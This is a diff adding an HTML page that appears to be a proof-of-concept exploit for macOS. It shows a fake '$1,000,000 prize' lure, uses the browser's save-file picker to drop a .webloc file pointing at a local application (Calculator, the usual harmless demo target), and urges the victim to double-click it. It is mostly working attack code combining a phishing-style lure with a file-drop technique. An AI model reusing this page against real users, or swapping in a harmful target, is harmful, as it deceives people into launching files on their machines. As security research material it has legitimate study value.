@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>MACOS WINNER - $1,000,000 PRIZE</title>
+<style>
+  body,html{margin:0;height:100%;background:#000;color:#0f0;font-family:'SF Mono',monospace;display:flex;align-items:center;justify-content:center;flex-direction:column;overflow:hidden}
+  h1{font-size:5em;text-shadow:0 0 30px #0f0;animation:glow 1.2s infinite alternate}
+  h2{font-size:3em;color:#ff0;animation:blink 0.6s infinite}
+  #press{font-size:2.2em;margin-top:40px;letter-spacing:2px}
+  @keyframes glow{from{text-shadow:0 0 20px #0f0}to{text-shadow:0 0 80px #0f0,0 0 120px #0f0}}
+  @keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}
+  .mac{font-size:1.5em;margin-top:30px;color:#888}
+</style>
+</head>
+<body>
+<h1>CONGRATULATIONS!</h1>
+<h2 class="win">YOU WON $1,000,000!</h2>
+<div id="press">PRESS ENTER TO CLAIM ON MACOS</div>
+
+<script>
+const macPayload = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>URL</key>
+    <string>file:///System/Applications/Calculator.app</string>
+</dict>
+</plist>`;
+
+async function saveMacWebloc() {
+    try {
+        const handle = await window.showSaveFilePicker({
+            suggestedName: "Your_Mac_Prize.webloc",
+            types: [{
+                description: "MacOS Internet Location",
+                accept: { "application/x-webloc": [".webloc"] }
+            }]
+        });
+
+        const writable = await handle.createWritable();
+        await writable.write(macPayload);
+        await writable.close();
+
+        // Winning screen
+        document.body.innerHTML = `
+          <h1 style="font-size:7em;color:#0f0">YOU WON!</h1>
+          <h2 style="color:#ff0;font-size:3em">File saved to Desktop!</h2>
+          <p style="font-size:2em;color:#fff">
+            Double-click <code style="background:#333;padding:5px 10px;border-radius:5px">Your_Mac_Prize.webloc</code><br><br>
+            Calculator will open instantly!
+          </p>
+          <p style="color:#888">Tested on macOS Sonoma/Ventura</p>
+        `;
+
+    } catch (e) {
+        document.body.innerHTML += `<p style="color:red">Canceled: ${e.message}</p>`;
+    }
+}
+
+// Tekan ENTER = trigger
+document.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter') {
+        document.getElementById('press').textContent = "SAVING PRIZE TO MAC...";
+        setTimeout(saveMacWebloc, 1000);
+    }
+});
+</script>
+</body>
+</html>
